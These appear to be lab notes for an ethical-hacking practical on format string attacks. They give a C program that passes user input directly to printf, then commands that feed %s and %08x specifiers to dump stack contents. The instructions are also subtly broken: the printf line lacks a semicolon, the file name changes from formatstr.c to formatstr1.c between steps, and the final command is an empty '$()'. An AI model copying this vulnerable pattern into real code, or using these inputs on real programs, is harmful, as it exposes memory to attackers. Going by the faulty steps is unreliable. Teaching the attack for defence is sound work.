# EHD Practical 15 - Format String Attack

###### tags: #EHD 

## Table of Contents
```toc
```

## Looking at Stack Contents Through Format String Attacks
**On Win10 VM**
1. Create the following C program called `formatstr.c`
```c
#include <stdio.h>
int main(int argc, char *argv[]) {
	printf(argv[1])
	return 0;
}
```

2. Compile the program
```
gcc -o formatstr1 formatstr1.c
```

3. Run the program with the argument `hello`
```
./formatstr1 hello
```

4. Run the program with the argument `hello%s`
```
./formatstr1 hello%s
```

5. Run the program with the argument `hello%08x`
```
./formatstr1 hello%08x
```

6. The data that appears after the string `hello` comes from the top of the stack
7. To see more of the stack, run the program with more format parameters
```
./formatstr1 %08x.%08x.%08x.%08x
```

8. To see even more content from the stack, use a Perl or Python script to generate the format parameters
```
./formatstr1 $(perl -e 'print "%08x." x 40')
./formatstr1 $()
```